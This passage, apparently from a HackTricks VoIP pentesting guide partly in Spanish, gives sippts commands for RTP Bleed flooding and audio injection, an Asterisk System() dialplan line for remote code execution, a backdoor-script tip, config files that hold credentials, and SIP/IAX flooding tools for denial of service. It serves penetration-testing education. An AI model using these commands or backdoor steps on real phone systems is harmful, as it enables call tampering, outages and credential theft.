* **`SIPPTS rtpbleedflood`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood explota la vulnerabilidad RTP Bleed enviando flujos RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject explota la vulnerabilidad RTP Bleed inyectando un archivo de audio (formato WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

En Asterisk, de alguna manera logras **agregar reglas de extensi√≥n y recargarlas** (por ejemplo, comprometiendo un servidor de administrador web vulnerable), es posible obtener RCE utilizando el **`System`** command.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
There is command called **`Shell`** that could be used **instead of `System`** to execute system commands if necessary.

{% hint style="warning" %}
If the server is **disallowing the use of certain characters** in the **`System`** command (like in Elastix), check if the web server allows to **create files somehow inside the system** (like in Elastix or trixbox), and use it to **create a backdoor script** and then use **`System`** to **execute** that **script**.
{% endhint %}

#### Archivos locales interesantes y permisos

* **`sip.conf`** -> Contiene la contrase√±a de los usuarios SIP.
* Si el **servidor Asterisk se est√° ejecutando como root**, podr√≠as comprometer el root.
* El **usuario root de mysql** podr√≠a **no tener ninguna contrase√±a**.
* esto podr√≠a usarse para crear un nuevo usuario mysql como puerta trasera.
* **`FreePBX`**
* **`amportal.conf`** -> Contiene la contrase√±a del administrador del panel web (FreePBX).
* **`FreePBX.conf`** -> Contiene la contrase√±a del usuario FreePBXuser utilizado para acceder a la base de datos.
* esto podr√≠a usarse para crear un nuevo usuario mysql como puerta trasera.
* **`Elastix`**
* **`Elastix.conf`** -> Contiene varias contrase√±as en texto claro como la contrase√±a root de mysql, la contrase√±a de IMAPd, la contrase√±a del administrador web.
* **Varios folders** pertenecer√°n al usuario asterisk comprometido (si no se est√° ejecutando como root). Este usuario puede leer los archivos anteriores y tambi√©n controla la configuraci√≥n, por lo que podr√≠a hacer que Asterisk cargue otros binarios con puerta trasera cuando se ejecuten.

### Inyecci√≥n RTP

Es posible insertar un **`.wav`** en las conversaciones utilizando herramientas como **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) y **`rtpmixsound`** (`sudo apt install rtpmixsound`).

O podr√≠as usar los scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) para **escanear conversaciones** (**`rtpscan.pl`**), enviar un `.wav` a una conversaci√≥n (**`rtpsend.pl`**) e **insertar ruido** en una conversaci√≥n (**`rtpflood.pl`**).

### DoS

Hay varias formas de intentar lograr DoS en servidores VoIP.

* **`SIPPTS flood`** de [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood env√≠a mensajes ilimitados al objetivo.
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** de [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping realiza un ping SIP para ver el tiempo de respuesta del servidor.
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS protocolo IAX utilizado por Asterisk.
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Una herramienta para realizar inundaciones de mensajes SIP/SDP INVITE sobre UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Env√≠a varios paquetes RTP bien formados. Es necesario conocer los puertos RTP que se est√°n utilizando (esnifar primero).
* [**SIPp**](https://github.com/SIPp/sipp): Permite analizar y generar tr√°fico SIP, por lo que tambi√©n se puede usar para DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Cuchillo suizo SIP. Tambi√©n se puede usar para realizar ataques SIP.
* Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Vulnerabilidades del SO

La forma m√°s f√°cil de instalar un software como Asterisk es descargar una **distribuci√≥n de SO** que ya lo tenga instalado, como: **FreePBX, Elastix, Trixbox**... El problema con estos es que una vez que est√° funcionando, los administradores del sistema podr√≠an **no actualizarlos nuevamente** y **las vulnerabilidades** se descubrir√°n con el tiempo.

## Referencias

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
